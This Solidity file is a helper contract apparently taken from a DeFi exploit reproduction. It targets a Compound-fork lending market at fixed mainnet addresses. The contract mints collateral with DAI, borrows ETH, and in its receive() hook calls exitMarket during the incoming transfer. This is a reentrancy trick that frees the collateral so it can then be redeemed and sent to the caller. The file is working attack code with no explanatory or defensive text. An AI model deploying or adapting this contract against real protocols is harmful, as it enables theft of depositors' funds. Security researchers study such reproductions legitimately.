// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../HarvestFF/interfaces/IERC20.sol";
import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";


interface IFToken {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
}

contract Convert8 {
    ComptrollerInterface private constant unitroller = ComptrollerInterface(0xc54172e34046c1653d1920d40333Dd358c7a1aF4); // Unitroller
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    
    // FxToken Address
    // 0xe92a3db67e4b6AC86114149F522644b34264f858
    address constant fETH = address(0xbB025D470162CC5eA24daF7d4566064EE7f5F111); //fETH156
    address private fTokenCache;
    uint256 private mintTokenCache;

    constructor() {}

    receive () external payable {
        unitroller.exitMarket(fTokenCache);
    }   

    function _bootLoad(address fToken) external {
        fTokenCache = fToken;
        address[] memory em = new address[](1);
        em[0] = fToken;
        unitroller.enterMarkets(em);
    }
    function _cBorrow(uint cBorrow) external {
        IFToken(fETH).borrow(cBorrow);
    }

    function _cMint() external {
        DAI.approve(fTokenCache, type(uint256).max);
        uint _DAIBalance = DAI.balanceOf(address(this));
        CErc20Interface(fTokenCache).mint(_DAIBalance);
        mintTokenCache = _DAIBalance;
    }


    function _cRedeemAll() external {
        CErc20Interface(fTokenCache).approve(fTokenCache, type(uint256).max);
        CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

        uint256 new_DAIBalance = DAI.balanceOf(address(this));
        DAI.transfer(msg.sender, new_DAIBalance);
        payable(msg.sender).transfer(address(this).balance);
    }
}
